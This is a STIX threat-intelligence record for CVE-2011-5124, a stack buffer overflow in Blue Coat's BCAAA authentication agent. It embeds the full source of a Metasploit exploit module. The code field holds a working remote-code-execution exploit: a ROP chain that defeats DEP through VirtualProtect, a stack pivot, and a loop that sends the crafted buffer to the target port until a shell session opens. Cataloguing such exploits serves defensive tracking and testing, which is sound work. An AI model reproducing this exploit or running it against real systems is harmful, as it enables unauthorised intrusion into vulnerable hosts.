{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c37e5c63-b4e7-4f5d-9ca1-3784619f3812",
    "created": "2024-08-14T16:47:22.47102Z",
    "modified": "2024-08-14T16:47:22.471024Z",
    "name": "\"Blue Coat Authentication and Authorization Agent (BCAAA) 5 Buffer Overflow\"",
    "description": " This module exploits a stack buffer overflow in process bcaaa-130.exe (port 16102) which comes as part of the Blue Coat Authentication proxy.  Please note that by default this exploit will attempt up to three times in order to successfully gain remote code execution (in some cases, it takes as many as five times).  This can cause your activity to look even more suspicious.  To modify the number of exploit attempts, set the ATTEMPTS option.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/bcaaa_bof.rb",
            "external_id": "bcaaa_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-5124"
        },
        {
            "source_name": "reference",
            "url": "https://kb.bluecoat.com/index?page=content&id=SA55"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/bugtraq/2011/Jul/44"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Blue Coat Authentication and Authorization Agent (BCAAA) 5 Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in process bcaaa-130.exe (port 16102),\n        which comes as part of the Blue Coat Authentication proxy.  Please note that by default,\n        this exploit will attempt up to three times in order to successfully gain remote code\n        execution (in some cases, it takes as many as five times).  This can cause your activity\n        to look even more suspicious.  To modify the number of exploit attempts, set the\n        ATTEMPTS option.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Paul Harrington', # Initial discovery and PoC\n          'Travis Warren',   # MSF Module with Universal DEP/ASLR bypass\n          'sinn3r',          # More testing / reliability, plus minor changes\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-5124' ],\n          [ 'OSVDB', '72095'],\n          [ 'URL', 'https://kb.bluecoat.com/index?page=content&id=SA55' ],\n          [ 'URL', 'https://seclists.org/bugtraq/2011/Jul/44' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 936,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'BCAAA Version 5.4.6.1.54128', {} ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-04-04',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          Opt::RPORT(16102),\n          OptInt.new(\"ATTEMPTS\", [true, \"Number of attempts to try to exploit\", 3]),\n        ])\n  end\n\n  def junk\n    return rand_text(4).unpack(\"L\")[0].to_i\n  end\n\n  def exploit\n\n    rop_gadgets = [\n      # rop chain generated with mona.py\n      0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\n      0x7c37a140,  # Make EAX readable\n      0x7c37591f,  # PUSH ESP # ... # POP ECX # POP EBP # RETN (MSVCR71.dll)\n      junk,        # EBP (filler)\n      0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\n      0x7c37a140,  # <- *&VirtualProtect()\n      0x7c3530ea,  # MOV EAX,DWORD PTR DS:[EAX] # RETN (MSVCR71.dll)\n      0x7c346c0b,  # Slide, so next gadget would write to correct stack location\n      0x7c376069,  # MOV [ECX+1C],EAX # P EDI # P ESI # P EBX # RETN (MSVCR71.dll)\n      junk,        # EDI (filler)\n      junk,        # will be patched at runtime (VP), then picked up into ESI\n      junk,        # EBX (filler)\n      0x7c376402,  # POP EBP # RETN (msvcr71.dll)\n      0x7c345c30,  # ptr to 'push esp #  ret ' (from MSVCR71.dll)\n      0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\n      0xfffffdff,  # size 0x00000201 -> ebx, modify if needed\n      0x7c351e05,  # NEG EAX # RETN (MSVCR71.dll)\n      0x7c354901,  # POP EBX # RETN (MSVCR71.dll)\n      0xffffffff,  # pop value into ebx\n      0x7c345255,  # INC EBX # FPATAN # RETN (MSVCR71.dll)\n      0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN (MSVCR71.dll)\n      0x7c34d201,  # POP ECX # RETN (MSVCR71.dll)\n      0x7c38b001,  # RW pointer (lpOldProtect) (-> ecx)\n      0x7c34b8d7,  # POP EDI # RETN (MSVCR71.dll)\n      0x7c34b8d8,  # ROP NOP (-> edi)\n      0x7c344f87,  # POP EDX # RETN (MSVCR71.dll)\n      0xffffffc0,  # value to negate, target value : 0x00000040, target: edx\n      0x7c351eb1,  # NEG EDX # RETN (MSVCR71.dll)\n      0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\n      0x90909090,  # NOPS (-> eax)\n      0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN (MSVCR71.dll)\n    ].pack(\"V*\")\n\n    pivot = [\n      0x7C3410C4,  # RETN (MSVCR71.dll)\n      0x1003800C,  # PUSH ESP; POP EBX; POP EBP; RETN (SmAgentAPI.dll)\n      0x4241467D,  # EBP\n      0x7C3C8937,  # XCHG EAX,EBP; RETN (MSVCP71.dll)\n      0x7C3417D2,  # SUB EAX,EAX; RETN (MSVCR71.dll)\n      0x7C3C8937,  # XCHG EAX,EBP; RETN (MSVCP71.dll)\n      0x7C34f6C2,  # MOV EAX, EBX; POP EBX; RETN (MSVCR71.dll)\n      junk,        # EBX\n      0x7C3C8937,  # XCHG EAX,EBP; RETN (MSVCP71.dll)\n      0x5D02D0A0,  # SUB EBP,EAX; RETN (MSVCR70.dll)\n      0x7C3C8937,  # XCHG EAX,EBP; RETN (MSVCP71.dll)\n      0x7C3B5080,  # XCHG EAX,ESP; RETN (MSVCP71.dll)\n    ].pack(\"V*\")\n\n    attempts = datastore['ATTEMPTS']\n\n    #Sometimes a few attempts are needed to get a shell back (3 or 5 times)\n    attempts.times do |i|\n      #If we have a session on the box already, then we don't continue trying\n      break if session_created?\n      buffer =  rand_text(8)\n      buffer << rop_gadgets\n      buffer << payload.encoded\n      buffer << 'EBAB'\n      buffer << rand_text(8)\n      buffer << pivot\n\n      connect\n      print_status(\"Sending request to #{rhost}. Attempt ##{(i+1).to_s}...\")\n      sock.put(buffer)\n      handler\n      select(nil, nil, nil, 2)\n      disconnect\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-04-04",
    "x_mitre_platforms": [
        "win'"
    ]
}